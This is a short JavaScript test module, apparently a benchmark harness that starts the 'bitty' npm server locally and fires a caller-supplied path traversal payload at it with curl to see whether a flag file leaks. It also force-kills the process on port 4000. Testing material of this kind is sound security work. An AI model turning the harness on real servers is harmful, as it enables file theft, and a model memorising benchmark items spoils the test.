function exploitFunction(payload) {  // Pass payload as an argument
  const path = require("path");
  const execSync = require("child_process").execSync;
  const sleep = require("sleep");

  afterAll(() => {
    try {
      execSync("fuser -k 4000/tcp");
    } catch (e) {}
  });

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  test("Path Traversal in bitty", (done) => {
    expect.assertions(1);
    const fs = require("fs");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let server = "node ./node_modules/bitty/index.js";
    exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:4000${payload}"`;  // Use payload here
    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      done();
    });
  });
}

module.exports = { exploitFunction };